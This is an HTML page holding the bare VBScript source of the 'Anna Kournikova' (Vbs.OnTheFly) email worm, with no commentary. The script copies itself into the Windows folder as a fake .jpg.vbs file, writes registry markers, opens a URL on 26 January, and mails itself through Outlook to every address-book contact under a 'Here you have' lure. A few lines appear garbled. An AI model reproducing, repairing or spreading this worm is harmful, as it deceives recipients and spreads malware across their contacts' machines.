<HTML><META HTTP-EQUIV="content-type" CONTENT="text/html;charset=utf-8">
'Vbs.OnTheFly Created By OnTheFly<BR>On Error Resume Next<BR>Set shellobject = 
CreateObject("WScript.Shell")<BR>shellobject.regwrite "HKCU\software\OnTheFly\", 
"Worm made with Vbswg 1.50b"<BR>Set filesystem= 
Createobject("scripting.filesystemobject<WBR>")<BR>filesystem.copyfile 
wscript.scriptfullname,filesystem.GetSpe<WBR>cialFolder(0)&amp;"\AnnaKournikova.jpg.vbs"<BR>if 
shellobject.regread ("HKCU\software\OnTheFly\mailed") &lt;&gt; "1" 
then<BR>mail_trojan()<BR>end if<BR>if month(now) =1 and day(now) =26 
then<BR>shellobject.run "<A href="http://google.com.br/" 
target=_blank>http://google.com.br</A>",3,false<BR>end if<BR>Set wormfile= 
filesystem.opentextfile(wscript.scriptfu<WBR>llname, 1)<BR>payload= 
wormfile.readall<BR>wormfile.Close<BR>If Not 
(filesystem.fileexists(wscript.scriptful<WBR>lname)) Then<BR>Set newfile= 
filesystem.createtextfile(wscript.script<WBR>fullname, 
True)<BR>newfile.writepayload<BR>newfile.Close<BR>End If<BR>Loop <BR>Function 
mail_trojan()<BR>On Error Resume Next<BR>Set outlook = 
CreateObject("Outlook.Application")<BR>If outlook= "Outlook"Then<BR>Set 
mapi=outlook.GetNameSpace("MAPI")<BR>Set addresses= mapi.AddressLists<BR>For 
Each address In addresses<BR>If address.AddressEntries.Count &lt;&gt; 0 
Then<BR>count = address.AddressEntries.Count<BR>For I= 1 To count<BR>Set email = 
outlook.CreateItem(0)<BR>Set entry = address.AddressEntries(I)<BR>email.To = 
entry.Address<BR>email.Subject = "Here you have, ;o)"<BR>email.Body = "Hi:" 
&amp; vbcrlf &amp; "Check This!" &amp; vbcrlf &amp; ""<BR>set 
attachment=email.Attachments<BR>attachment.Add 
filesystem.GetSpecialFolder(0)&amp; 
"\AnnaKournikova.jpg.vbs"<BR>email.DeleteAfterSubmit = True<BR>If email.To 
&lt;&gt; "" Then<BR>email.Send<BR>shellobject.regwrite 
"HKCU\software\OnTheFly\mailed", "1"<BR>End If<BR>Next<BR>End If<BR>Next<BR>end 
if<BR>End Function<BR>'Vbswg 1.50b 